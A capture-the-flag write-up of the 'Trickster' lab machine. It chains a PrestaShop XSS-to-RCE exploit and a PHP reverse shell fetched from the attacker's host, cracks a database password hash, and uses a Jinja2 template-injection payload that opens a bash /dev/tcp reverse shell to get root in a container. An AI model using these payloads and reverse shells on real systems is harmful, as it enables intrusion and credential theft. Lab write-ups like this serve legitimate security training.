# Trickster

<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

## Port scan

```bash
╰─➤  ../fnn 10.129.224.161
Running initial fast Nmap scan on 10.129.224.161...
Open ports: 22,80
Running detailed Nmap scan on ports: 22,80...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 09:28 IST
Nmap scan report for 10.129.224.161 (10.129.224.161)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://trickster.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.38 seconds
Scan complete. Results saved in 10.129.224.161.ports.scan
```

## Subdomain

Upon looking the website, we find `shop.trickster.htb`&#x20;

```bash
╰─➤  ffuf -u http://trickster.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.trickster.htb'  -fw 20

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://trickster.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.trickster.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 229 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```

```bash
10.129.224.161 shop.trickster.htb trickster.htb
```

## Directory bruteforce

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shop.trickster.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          283
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 323] [--> http://shop.trickster.htb/.git/]
/.git/HEAD            (Status: 200) [Size: 28]
/.git/config          (Status: 200) [Size: 112]
/.git/logs/           (Status: 200) [Size: 1137]
/.git/index           (Status: 200) [Size: 252177]
Progress: 4730 / 4730 (100.00%)
===============================================================
Finished
===============================================================
```



We will use `git-dumper` to download all files inside the .git folder

```bash
total 232K
drwxr-xr-x 4 kali kali 4.0K Sep 22 16:05 .
drwxr-xr-x 4 kali kali 4.0K Sep 22 16:04 ..
drwxr-xr-x 8 kali kali 4.0K Sep 22 16:05 admin634ewutrx1jgitlooaj
-rw-r--r-- 1 kali kali 1.3K Sep 22 16:05 autoload.php
-rw-r--r-- 1 kali kali 2.5K Sep 22 16:05 error500.html
drwxr-xr-x 7 kali kali 4.0K Sep 22 16:05 .git
-rw-r--r-- 1 kali kali 1.2K Sep 22 16:05 index.php
-rw-r--r-- 1 kali kali 1.3K Sep 22 16:05 init.php
-rw-r--r-- 1 kali kali  522 Sep 22 16:05 Install_PrestaShop.html
-rw-r--r-- 1 kali kali 5.0K Sep 22 16:05 INSTALL.txt
-rw-r--r-- 1 kali kali 180K Sep 22 16:05 LICENSES
-rw-r--r-- 1 kali kali  863 Sep 22 16:05 Makefile
-rw-r--r-- 1 kali kali 1.6K Sep 22 16:05 .php-cs-fixer.dist.php
```



## Web exploitation

### Enumeration

```bash
     --- ===== Installation instructions for PrestaShop 8 ===== ---
```

If we read INSTALL.txt we can see it's using PrestaShop 8

After we visit `/admin634ewutrx1jgitlooaj`, We can see version: `8.1.5`

### XSS->RCE

Upon googling `Petrashop ecommerce RCE with the version` we get\
[https://github.com/aelmokhtar/CVE-2024-34716](https://github.com/aelmokhtar/CVE-2024-34716)\
\
We can further exploit this.

### Edits

So there are few things we need to edit inside `expoit.html`and `exploit.py`

HTML edits:

```javascript
const baseUrl = 'http://shop.trickster.htb'; //'http://prestashop:8000'; 
const path = 'admin634ewutrx1jgitlooaj';  //'admin-dev';
const httpServerIp = '<YOUR IP>';
const httpServerPort = 81;
const fileNameOfTheme = "ps_next_8_theme_malicious.zip";
```

Exploit.py Edits:

```python
def send_get_requests(interval=1):
    url = f"{host_url}/themes/next/a.php" #reverse_shell.php
```

Zip file:

unzip the given `ps_next_8_theme_malicious.zip` file, edit `a.php` and add your IP to it.

Make a zip after the edit, we'll use this zip to get a reverse shell.

### www-data shell

Start python server.

```python
-$ sudo python3 -m http.server 81                    1 ↵
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.129.56.43 - - [22/Sep/2024 20:59:43] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -
```

And run exploit.py

```bash
╰─➤  python3 exploit.py                             
[?] Please enter the URL (e.g., http://prestashop:8000): http://shop.trickster.htb
[?] Please enter your email: heap@heap.htb
[?] Please enter your message: exploit
[?] Please provide the path to your HTML file: exploit.html
[X] Yay! Your exploit was sent successfully!
[X] Once a CS agent clicks on attachement, you'll get a SHELL
listening on [any] 1234 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.56.43] 47792
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 15:33:00 up  2:57,  0 users,  load average: 0.94, 0.27, 0.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



## User shell (james)

Just for sake of ease, i added reverse\_shell into `http://trickster.htb/asset` so I can pull up more shells if needed. (with little tweak on `$port=$_GET['port'];`)

```bash
www-data@trickster:~/trickster/assets/php$ wget 10.10.16.4:5000/reverse_shell.php
wget 10.10.16.4:5000/reverse_shell.php
--2024-09-22 15:53:06--  http://10.10.16.4:5000/reverse_shell.php
Connecting to 10.10.16.4:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5498 (5.4K) [application/octet-stream]
Saving to: ‘reverse_shell.php’

reverse_shell.php   100%[===================>]   5.37K  --.-KB/s    in 0.1s    

2024-09-22 15:53:06 (38.9 KB/s) - ‘reverse_shell.php’ saved [5498/5498]
```

```
http://trickster.htb/assets/php/reverse_shell.php?port=4444

─➤  rlwrap nc -nvlp 4444                                                            
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.56.43] 57630
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 15:53:33 up  3:17,  0 users,  load average: 0.07, 0.17, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Great, it's working.

Running linpeas, found us db creds

```bash
/var/www/prestashop/app/config/parameters.php:7: 'database_user' => 'ps_user',
/var/www/prestashop/app/config/parameters.php:8: 'database_password' => 'prest@shop_o'
```

We can use mysql cli with `-e` to run cmds, we will use `-e` since we dont have a proper tty shell.

```sql
www-data@trickster:~/trickster/assets/php$ mysql -u ps_user -pprest@shop_o -e 'use prestashop;select id_employee,lastname,firstname,email,passwd from ps_employee';
mysql -u ps_user -pprest@shop_o -e 'use prestashop;select id_employee,lastname,firstname,email,passwd from ps_employee';
+-------------+----------+-----------+---------------------+--------------------------------------------------------------+
| id_employee | lastname | firstname | email               | passwd                                                       |
+-------------+----------+-----------+---------------------+--------------------------------------------------------------+
|           1 | Store    | Trickster | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C |
|           2 | james    | james     | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm |
+-------------+----------+-----------+---------------------+--------------------------------------------------------------+
```

And we can crack the password with `john` or `hashcat`

```bash
╰─➤  cat james.hash                     
$2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm

╰─➤  john --wordlist=/usr/share/wordlists/rockyou.txt james.hash                                
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alwaysandforever (?)     
1g 0:00:00:02 DONE (2024-09-22 22:05) 0.3816g/s 14180p/s 14180c/s 14180C/s baloon..191092
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

DONEEEE!!!

```bash
╰─➤  ssh james@trickster.htb                      
The authenticity of host 'trickster.htb (10.129.56.43)' can't be established.
ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'trickster.htb' (ED25519) to the list of known hosts.
james@trickster.htb's password: 
james@trickster:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)
```

## Root

linpeas, netstat, sudo -l, find, and other few techniques I tried didn't worked.

If we see all all interfaces on the system with `ip addr` we can find docker on `172.17.0.0/16` subnet, although there were no ports seen on netstat that might use docker, we can do pivoting, create a tunnel using `ligolo` and scan internal network.

&#x20;However, installing and running ligolo is not in the scope of this writeup, you can refer to the following blog,

{% embed url="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740" %}

OR

We can use static binaries from, \
[https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)\


easy and fast way is to ping sweep

```bash
james@trickster:/tmp/heap$ netstat -rn
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
0.0.0.0         10.129.0.1      0.0.0.0         UG        0 0          0 eth0
10.129.0.0      0.0.0.0         255.255.0.0     U         0 0          0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U         0 0          0 docker0

james@trickster:/tmp/heap$ for i in $(seq 254) ; do ping -c1 -W1 172.17.0.$i & done | grep from
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.049 ms
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.046 ms
```

We can see 2 hosts alive, we can start nmap on these 2 hosts to see open ports.

```bash
james@trickster:/tmp/heap$ ./nmap 172.17.0.1 -p- --min-rate=10000 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-09-25 15:21 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00053s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 35.28 seconds
james@trickster:/tmp/heap$ ./nmap 172.17.0.2 -p- --min-rate=10000 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-09-25 15:22 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.2
Host is up (0.00051s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 35.80 seconds
```

Alr, we can port forward `172.17.0.2:5000`

<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

The webpage is using, `Changedetection 0.45.2` after a google search, we find this exploit.

{% embed url="https://www.exploit-db.com/exploits/52027" %}

Th exploit didn't work, let's try manually.

#### Login form password is the same we used for james (alwaysandforever)

{% embed url="https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/" %}

Since it's using jinja, we can jump to,&#x20;

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti" %}

Payload used:

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'sh -i >& /dev/tcp/10.10.16.15/9001 0>&1'").read()}}{%endif%}{% endfor %}
```

<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

Click on send notifications and get the shell

#### Shell

```bash
╰─➤  rlwrap nc -nvlp 4444                                                                                                                                                                      1 ↵
listening on [any] 4444 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.154.55] 41716
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@ae5c137aa8ef:/app# history
history
    1  apt update
    2  #YouC4ntCatchMe#

```

in the history you can see the root password,

<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

DONE!!

\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning
